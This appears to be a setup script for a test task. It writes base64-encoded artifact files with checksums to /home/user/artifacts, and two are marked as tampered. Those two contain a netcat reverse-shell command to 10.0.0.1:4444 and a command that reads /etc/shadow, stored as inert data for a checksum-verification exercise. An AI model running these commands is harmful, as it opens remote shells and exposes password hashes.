#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    mkdir -p /home/user/artifacts

    python3 -c "
import os
import base64
import hashlib

artifacts_dir = '/home/user/artifacts'
os.makedirs(artifacts_dir, exist_ok=True)

payloads = [
    ('artifact_1.txt', b\"echo 'Safe execution'\", False),
    ('artifact_2.txt', b'nc -e /bin/sh 10.0.0.1 4444', True),
    ('artifact_3.txt', b'ls -la /var/www/html', False),
    ('artifact_4.txt', b'cat /etc/shadow', True),
    ('artifact_5.txt', b'ping -c 4 8.8.8.8', False),
]

for filename, content, is_tampered in payloads:
    b64_payload = base64.b64encode(content).decode('utf-8')

    if is_tampered:
        checksum = hashlib.sha256(b'tampered_data').hexdigest()
    else:
        checksum = hashlib.sha256(content).hexdigest()

    file_content = f'Encoding: base64\nChecksum: {checksum}\nPayload: {b64_payload}\n'

    with open(os.path.join(artifacts_dir, filename), 'w') as f:
        f.write(file_content)
"

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
